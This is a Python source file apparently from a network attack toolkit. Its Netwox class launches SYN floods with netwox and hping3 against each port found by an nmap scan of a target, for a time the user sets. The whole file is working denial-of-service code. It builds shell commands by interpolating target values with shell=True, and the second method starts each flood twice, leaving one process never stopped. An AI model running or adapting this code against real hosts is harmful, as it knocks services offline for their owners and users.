import os
import time
import signal
from Classes.nmap import nmap_object
from Classes.constants import constants
import subprocess

class Netwox:

    def syn_flood_network(self, nmap_o: nmap_object):
        attack_time = int(input("Input attack time\n"))
        for port in nmap_o.ports:
            cmd = ('sudo netwox 76 -i %s -p %s -s raw' % (nmap_o.name, port))
            print(cmd)
            pro = subprocess.Popen(cmd,
                                   stdout=subprocess.PIPE,
                                   shell=True,
                                   preexec_fn=os.setsid)
            time.sleep(attack_time)
            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)

    def syn_flood_attack(self, nmap_o: nmap_object, intensity: int):
        format_intensity = constants.intencity[intensity]
        attack_time = int(input("Input attack time\n"))
        for port in nmap_o.ports:
            cmd = ('sudo hping3 -S --%s -p %s %s' % (format_intensity, port, nmap_o.name))
            subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
            print(cmd)
            pro = subprocess.Popen(cmd,
                                   stdout=subprocess.PIPE,
                                   shell=True,
                                   preexec_fn=os.setsid)
            time.sleep(attack_time)
            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)